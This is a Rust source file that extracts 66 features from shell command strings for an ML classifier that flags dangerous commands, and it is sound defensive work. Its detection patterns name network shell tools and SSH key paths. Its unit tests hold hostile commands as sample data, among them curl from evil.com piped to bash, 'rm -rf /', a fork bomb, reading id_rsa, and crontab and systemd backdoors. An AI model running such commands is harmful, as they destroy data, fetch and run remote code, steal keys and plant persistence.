use std::collections::HashMap;

/// 50+ extracted features from a command string.
/// Used as input to the ML classifier and ensemble scorer.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct CommandFeatures {
    // ── Length & entropy (5) ──
    pub char_len: f64,
    pub word_count: f64,
    pub avg_word_len: f64,
    pub entropy: f64,
    pub max_token_len: f64,

    // ── Shell syntax (8) ──
    pub has_pipe: f64,
    pub has_semicolon: f64,
    pub has_backtick: f64,
    pub has_var_sub: f64,
    pub has_redirect: f64,
    pub has_heredoc: f64,
    pub has_subshell: f64,
    pub has_logical_op: f64,

    // ── Dangerous patterns (10) ──
    pub has_rm_rf: f64,
    pub has_dd: f64,
    pub has_mkfs: f64,
    pub has_chmod_recursive: f64,
    pub has_chown: f64,
    pub has_wget_curl: f64,
    pub has_bash_network: f64,
    pub has_eval: f64,
    pub has_wget_to_pipe: f64,
    pub has_curl_to_pipe: f64,

    // ── Encoding anomalies (5) ──
    pub has_base64: f64,
    pub has_hex_encoding: f64,
    pub has_rot13: f64,
    pub has_url_encoding: f64,
    pub has_unicode_escape: f64,

    // ── Path analysis (8) ──
    pub has_system_path: f64,
    pub has_proc_path: f64,
    pub has_dev_path: f64,
    pub has_ssh_path: f64,
    pub has_git_path: f64,
    pub has_dot_dir: f64,
    pub has_temp_path: f64,
    pub has_home_path: f64,

    // ── Network indicators (6) ──
    pub has_ip_address: f64,
    pub has_url: f64,
    pub has_port: f64,
    pub has_domain_name: f64,
    pub has_localhost: f64,
    pub has_network_conn: f64,

    // ── Process manipulation (6) ──
    pub has_kill: f64,
    pub has_nohup: f64,
    pub has_disown: f64,
    pub has_bg: f64,
    pub has_fork_bomb: f64,
    pub has_ptrace: f64,

    // ── Privilege escalation (5) ──
    pub has_sudo: f64,
    pub has_su: f64,
    pub has_setuid: f64,
    pub has_capability: f64,
    pub has_pkexec: f64,

    // ── Persistence (4) ──
    pub has_cron: f64,
    pub has_systemd: f64,
    pub has_rc_local: f64,
    pub has_ssh_authorized: f64,

    // ── Compression/Archival (3) ──
    pub has_tar: f64,
    pub has_zip: f64,
    pub has_gzip: f64,

    // ── Compilation (3) ──
    pub has_gcc: f64,
    pub has_make: f64,
    pub has_cc: f64,

    // ── Raw count features (3) ──
    pub special_char_ratio: f64,
    pub digit_ratio: f64,
    pub uppercase_ratio: f64,
}

impl CommandFeatures {
    pub fn as_feature_vec(&self) -> Vec<f64> {
        vec![
            self.char_len, self.word_count, self.avg_word_len, self.entropy, self.max_token_len,
            self.has_pipe, self.has_semicolon, self.has_backtick, self.has_var_sub,
            self.has_redirect, self.has_heredoc, self.has_subshell, self.has_logical_op,
            self.has_rm_rf, self.has_dd, self.has_mkfs, self.has_chmod_recursive, self.has_chown,
            self.has_wget_curl, self.has_bash_network, self.has_eval,
            self.has_wget_to_pipe, self.has_curl_to_pipe,
            self.has_base64, self.has_hex_encoding, self.has_rot13, self.has_url_encoding,
            self.has_unicode_escape,
            self.has_system_path, self.has_proc_path, self.has_dev_path, self.has_ssh_path,
            self.has_git_path, self.has_dot_dir, self.has_temp_path, self.has_home_path,
            self.has_ip_address, self.has_url, self.has_port, self.has_domain_name,
            self.has_localhost, self.has_network_conn,
            self.has_kill, self.has_nohup, self.has_disown, self.has_bg, self.has_fork_bomb,
            self.has_ptrace,
            self.has_sudo, self.has_su, self.has_setuid, self.has_capability, self.has_pkexec,
            self.has_cron, self.has_systemd, self.has_rc_local, self.has_ssh_authorized,
            self.has_tar, self.has_zip, self.has_gzip,
            self.has_gcc, self.has_make, self.has_cc,
            self.special_char_ratio, self.digit_ratio, self.uppercase_ratio,
        ]
    }

    /// Number of features in the feature vector.
    pub const fn feature_count() -> usize {
        66
    }

    /// Feature names for interpretability.
    pub fn feature_names() -> Vec<&'static str> {
        vec![
            "char_len", "word_count", "avg_word_len", "entropy", "max_token_len",
            "has_pipe", "has_semicolon", "has_backtick", "has_var_sub",
            "has_redirect", "has_heredoc", "has_subshell", "has_logical_op",
            "has_rm_rf", "has_dd", "has_mkfs", "has_chmod_recursive", "has_chown",
            "has_wget_curl", "has_bash_network", "has_eval",
            "has_wget_to_pipe", "has_curl_to_pipe",
            "has_base64", "has_hex_encoding", "has_rot13", "has_url_encoding",
            "has_unicode_escape",
            "has_system_path", "has_proc_path", "has_dev_path", "has_ssh_path",
            "has_git_path", "has_dot_dir", "has_temp_path", "has_home_path",
            "has_ip_address", "has_url", "has_port", "has_domain_name",
            "has_localhost", "has_network_conn",
            "has_kill", "has_nohup", "has_disown", "has_bg", "has_fork_bomb", "has_ptrace",
            "has_sudo", "has_su", "has_setuid", "has_capability", "has_pkexec",
            "has_cron", "has_systemd", "has_rc_local", "has_ssh_authorized",
            "has_tar", "has_zip", "has_gzip",
            "has_gcc", "has_make", "has_cc",
            "special_char_ratio", "digit_ratio", "uppercase_ratio",
        ]
    }
}

/// Extracts 50+ features from a command string.
pub struct FeatureExtractor;

impl FeatureExtractor {
    pub fn new() -> Self {
        Self
    }

    pub fn extract(&self, command: &str) -> CommandFeatures {
        let chars: Vec<char> = command.chars().collect();
        let words: Vec<&str> = command.split_whitespace().collect();
        let lower = command.to_lowercase();

        CommandFeatures {
            // Length & entropy
            char_len: chars.len() as f64,
            word_count: words.len() as f64,
            avg_word_len: if words.is_empty() { 0.0 } else { words.iter().map(|w| w.len() as f64).sum::<f64>() / words.len() as f64 },
            entropy: Self::calc_entropy(command),
            max_token_len: words.iter().map(|w| w.len() as f64).fold(0.0, f64::max),

            // Shell syntax
            has_pipe: Self::bool_flag(command.contains('|')),
            has_semicolon: Self::bool_flag(command.contains(';')),
            has_backtick: Self::bool_flag(command.contains('`')),
            has_var_sub: Self::bool_flag(command.contains("$(") || command.contains("${")),
            has_redirect: Self::bool_flag(command.contains('>') || command.contains('<')),
            has_heredoc: Self::bool_flag(lower.contains("<<")),
            has_subshell: Self::bool_flag(command.contains("$(")),
            has_logical_op: Self::bool_flag(command.contains("&&") || command.contains("||")),

            // Dangerous patterns
            has_rm_rf: Self::bool_flag(lower.contains("rm ") && (lower.contains("-rf") || lower.contains("-fr") || lower.contains("--recursive"))),
            has_dd: Self::bool_flag(lower.contains(" dd ") || lower.starts_with("dd ")),
            has_mkfs: Self::bool_flag(lower.contains("mkfs") || lower.contains("format")),
            has_chmod_recursive: Self::bool_flag(lower.contains("chmod") && (lower.contains("-r") || lower.contains("--recursive"))),
            has_chown: Self::bool_flag(lower.contains("chown")),
            has_wget_curl: Self::bool_flag(lower.contains("wget ") || lower.contains("curl ")),
            has_bash_network: Self::bool_flag(lower.contains("/dev/tcp/") || lower.contains("/dev/udp/")),
            has_eval: Self::bool_flag(lower.contains(" eval ") || lower.starts_with("eval ")),
            has_wget_to_pipe: Self::bool_flag(lower.contains("wget") && lower.contains("|")),
            has_curl_to_pipe: Self::bool_flag(lower.contains("curl") && lower.contains("|")),

            // Encoding anomalies
            has_base64: Self::bool_flag(lower.contains("base64")),
            has_hex_encoding: Self::bool_flag(lower.contains("\\x") || lower.contains("0x")),
            has_rot13: Self::bool_flag(lower.contains("rot13") || lower.contains("tr ") && lower.contains("a-z") && lower.contains("n-za-m")),
            has_url_encoding: Self::bool_flag(command.contains('%') && (command.contains("%2") || command.contains("%3") || command.contains("%6"))),
            has_unicode_escape: Self::bool_flag(command.contains("\\u")),

            // Path analysis
            has_system_path: Self::bool_flag(lower.contains("/etc/") || lower.contains("/usr/") || lower.contains("/bin/") || lower.contains("/sbin/") || lower.contains("/boot/") || lower.contains("/lib/") || lower.contains("/opt/") || lower.contains("/var/")),
            has_proc_path: Self::bool_flag(lower.contains("/proc/")),
            has_dev_path: Self::bool_flag(lower.contains("/dev/")),
            has_ssh_path: Self::bool_flag(lower.contains(".ssh/") || lower.contains("/.ssh") || lower.contains("id_rsa") || lower.contains("authorized_keys") || lower.contains("known_hosts")),
            has_git_path: Self::bool_flag(lower.contains(".git/") || lower.contains("/.git")),
            has_dot_dir: Self::bool_flag(lower.len() >= 2 && (0..lower.len()-1).any(|i| &lower[i..i+2] == "/.")),
            has_temp_path: Self::bool_flag(lower.contains("/tmp/") || lower.contains("/temp/")),
            has_home_path: Self::bool_flag(lower.contains("/home/") || lower.contains("~/")),

            // Network indicators
            has_ip_address: Self::bool_flag(Self::has_ip_pattern(command)),
            has_url: Self::bool_flag(lower.contains("http://") || lower.contains("https://") || lower.contains("ftp://")),
            has_port: Self::bool_flag((0..chars.len().saturating_sub(2)).any(|i| {
                chars[i] == ':' && chars.get(i+1).is_some_and(|c| c.is_ascii_digit())
                    && chars.get(i+2).is_some_and(|c| c.is_ascii_digit())
            })),
            has_domain_name: Self::bool_flag(lower.contains(".com") || lower.contains(".org") || lower.contains(".net") || lower.contains(".io") || lower.contains(".sh") || lower.contains(".ru")),
            has_localhost: Self::bool_flag(lower.contains("localhost") || lower.contains("127.") || lower.contains("::1")),
            has_network_conn: Self::bool_flag(lower.contains("nc ") || lower.contains("netcat") || lower.contains("ncat") || lower.contains("socat") || lower.contains("telnet")),

            // Process manipulation
            has_kill: Self::bool_flag(lower.contains(" kill") || lower.starts_with("kill ") || lower.contains("pkill") || lower.contains("killall")),
            has_nohup: Self::bool_flag(lower.contains("nohup")),
            has_disown: Self::bool_flag(lower.contains("disown")),
            has_bg: Self::bool_flag(lower.contains("& ") || command.ends_with('&')),
            has_fork_bomb: Self::bool_flag(lower.contains(":(){") || lower.contains("fork") && lower.contains("bomb") || lower.contains(":(){ :|:& };:")),
            has_ptrace: Self::bool_flag(lower.contains("ptrace") || lower.contains("strace") || lower.contains("ltrace") || lower.contains("dtrace")),

            // Privilege escalation
            has_sudo: Self::bool_flag(lower.contains(" sudo") || lower.starts_with("sudo ")),
            has_su: Self::bool_flag(lower.contains(" su ") || lower.starts_with("su ")),
            has_setuid: Self::bool_flag(lower.contains("setuid") || lower.contains("setuid") || lower.contains("+s") || lower.contains("cap_")),
            has_capability: Self::bool_flag(lower.contains("cap_") || lower.contains("getcap") || lower.contains("setcap")),
            has_pkexec: Self::bool_flag(lower.contains("pkexec")),

            // Persistence
            has_cron: Self::bool_flag(lower.contains("cron") || lower.contains("crontab")),
            has_systemd: Self::bool_flag(lower.contains("systemd") || lower.contains("systemctl") || lower.contains("service ")),
            has_rc_local: Self::bool_flag(lower.contains("rc.local") || lower.contains("init.d") || lower.contains("rc.d")),
            has_ssh_authorized: Self::bool_flag(lower.contains("authorized_keys") || lower.contains("ssh-")),

            // Compression/Archival
            has_tar: Self::bool_flag(lower.contains(" tar ") || lower.starts_with("tar ")),
            has_zip: Self::bool_flag(lower.contains(" zip ") || lower.starts_with("zip ") || lower.contains("unzip")),
            has_gzip: Self::bool_flag(lower.contains("gzip") || lower.contains("gunzip") || lower.contains("gz")),

            // Compilation
            has_gcc: Self::bool_flag(lower.contains(" gcc") || lower.starts_with("gcc ") || lower.contains("g++")),
            has_make: Self::bool_flag(lower.contains(" make") || lower.starts_with("make ")),
            has_cc: Self::bool_flag(lower.contains(" cc ") || lower.starts_with("cc ") || lower.contains("rustc")),

            // Raw counts
            special_char_ratio: if chars.is_empty() { 0.0 } else {
                let special = chars.iter().filter(|c| !c.is_alphanumeric() && !c.is_whitespace()).count() as f64;
                special / chars.len() as f64
            },
            digit_ratio: if chars.is_empty() { 0.0 } else {
                let digits = chars.iter().filter(|c| c.is_ascii_digit()).count() as f64;
                digits / chars.len() as f64
            },
            uppercase_ratio: if chars.is_empty() { 0.0 } else {
                let upper = chars.iter().filter(|c| c.is_uppercase()).count() as f64;
                upper / chars.len() as f64
            },
        }
    }

    fn bool_flag(condition: bool) -> f64 {
        if condition { 1.0 } else { 0.0 }
    }

    fn calc_entropy(s: &str) -> f64 {
        if s.is_empty() {
            return 0.0;
        }
        let mut freq: HashMap<char, usize> = HashMap::new();
        for c in s.chars() {
            *freq.entry(c).or_default() += 1;
        }
        let len = s.len() as f64;
        freq.values().fold(0.0, |acc, &count| {
            let p = count as f64 / len;
            acc - p * p.log2()
        })
    }

    fn has_ip_pattern(s: &str) -> bool {
        // Check for IPv4 pattern (simplified)
        let bytes = s.as_bytes();
        for i in 0..bytes.len().saturating_sub(7) {
            if bytes[i].is_ascii_digit() {
                let mut dots = 0;
                for b in &bytes[i..bytes.len().min(i + 15)] {
                    if *b == b'.' {
                        dots += 1;
                    } else if !b.is_ascii_digit() {
                        break;
                    }
                    if dots == 3 {
                        break;
                    }
                }
                if dots == 3 {
                    return true;
                }
            }
        }
        false
    }
}

impl Default for FeatureExtractor {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_feature_count() {
        assert_eq!(CommandFeatures::feature_count(), 66);
    }

    #[test]
    fn test_feature_names_count() {
        assert_eq!(CommandFeatures::feature_names().len(), CommandFeatures::feature_count());
    }

    #[test]
    fn test_safe_command() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("ls -la");
        assert_eq!(f.char_len, 6.0);
        assert_eq!(f.word_count, 2.0);
        assert_eq!(f.has_rm_rf, 0.0);
        assert!((f.entropy - 2.25).abs() < 0.05, "entropy={}", f.entropy);
    }

    #[test]
    fn test_rm_rf_detected() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("rm -rf /");
        assert_eq!(f.has_rm_rf, 1.0);
    }

    #[test]
    fn test_network_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("curl http://evil.com/payload | bash");
        assert_eq!(f.has_wget_curl, 1.0);
        assert_eq!(f.has_curl_to_pipe, 1.0);
        assert_eq!(f.has_url, 1.0);
        assert_eq!(f.has_domain_name, 1.0);
    }

    #[test]
    fn test_base64_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("echo 'dGVzdA==' | base64 -d");
        assert_eq!(f.has_base64, 1.0);
    }

    #[test]
    fn test_fork_bomb_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract(":(){ :|:& };:");
        assert_eq!(f.has_fork_bomb, 1.0);
    }

    #[test]
    fn test_sudo_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("sudo rm -rf /etc");
        assert_eq!(f.has_sudo, 1.0);
        assert_eq!(f.has_rm_rf, 1.0);
    }

    #[test]
    fn test_ip_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("nc 192.168.1.1:4444");
        assert!(f.has_ip_address > 0.0, "has_ip_address should be 1.0");
        assert!(f.has_port > 0.0, "has_port should be 1.0");
        assert!(f.has_network_conn > 0.0, "has_network_conn should be 1.0");
    }

    #[test]
    fn test_ssh_path_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("cat ~/.ssh/id_rsa");
        assert_eq!(f.has_ssh_path, 1.0);
    }

    #[test]
    fn test_git_path_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("cat .git/config");
        assert_eq!(f.has_git_path, 1.0);
    }

    #[test]
    fn test_entropy_calculation() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("aaaa");
        // All same chars = 0 entropy
        assert!(f.entropy < 0.1);
        let f = fe.extract("abcd");
        // 4 distinct chars = 2.0 entropy
        assert!((f.entropy - 2.0).abs() < 0.1);
    }

    #[test]
    fn test_base64_command_high_entropy() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("echo 'dGVzdA==' | base64 -d > /tmp/payload");
        assert!(f.entropy > 2.5);
        assert!(f.special_char_ratio > 0.1);
    }

    #[test]
    fn test_empty_command() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("");
        assert_eq!(f.char_len, 0.0);
        assert_eq!(f.word_count, 0.0);
        assert_eq!(f.entropy, 0.0);
    }

    #[test]
    fn test_feature_vector_length() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("ls -la");
        let vec = f.as_feature_vec();
        assert_eq!(vec.len(), CommandFeatures::feature_count());
    }

    #[test]
    fn test_cron_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("echo '* * * * * root /tmp/backdoor' >> /etc/crontab");
        assert_eq!(f.has_cron, 1.0);
        assert_eq!(f.has_system_path, 1.0);
    }

    #[test]
    fn test_proc_path() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("cat /proc/self/maps");
        assert_eq!(f.has_proc_path, 1.0);
    }

    #[test]
    fn test_dev_path() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("dd if=/dev/zero of=/tmp/file bs=1M count=10");
        assert_eq!(f.has_dev_path, 1.0);
        assert_eq!(f.has_dd, 1.0);
    }

    #[test]
    fn test_feature_names_match_vector() {
        let names = CommandFeatures::feature_names();
        let fe = FeatureExtractor::new();
        let f = fe.extract("echo hello");
        let vec = f.as_feature_vec();
        assert_eq!(names.len(), vec.len());
    }

    #[test]
    fn test_systemd_detection() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("systemctl enable backdoor.service");
        assert_eq!(f.has_systemd, 1.0);
    }

    #[test]
    fn test_logical_ops() {
        let fe = FeatureExtractor::new();
        let f = fe.extract("wget http://x.com/p && bash p");
        assert_eq!(f.has_logical_op, 1.0);
        assert_eq!(f.has_wget_curl, 1.0);
    }
}
